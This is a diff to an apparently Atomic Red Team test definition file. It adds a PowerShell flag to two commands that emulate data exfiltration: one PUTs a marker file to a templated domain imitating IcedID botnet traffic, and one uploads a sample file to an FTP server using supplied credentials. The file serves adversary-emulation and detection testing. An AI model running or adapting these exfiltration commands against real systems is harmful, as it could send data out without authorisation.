@@ -24,7 +24,7 @@ atomic_tests:
       $url = "#{domain}"
       $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
       $contentType = "application/octet-stream"
-      try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
+      try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName -UseBasicParsing} catch{}
     cleanup_command: |-
       $fileName = "#{file}"
       Remove-Item -Path $fileName -ErrorAction Ignore
@@ -56,6 +56,6 @@ atomic_tests:
       Set-Content -Path "#{sampleFile}" -Value $sampleData
       $ftpUrl = "#{ftpServer}"
       $creds = Get-Credential -Credential "#{credentials}"
-      Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds
+      Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile "#{sampleFile}" -Credential $creds -UseBasicParsing
     cleanup_command: |
       Remove-Item -Path "#{sampleFile}" -ErrorAction Ignore
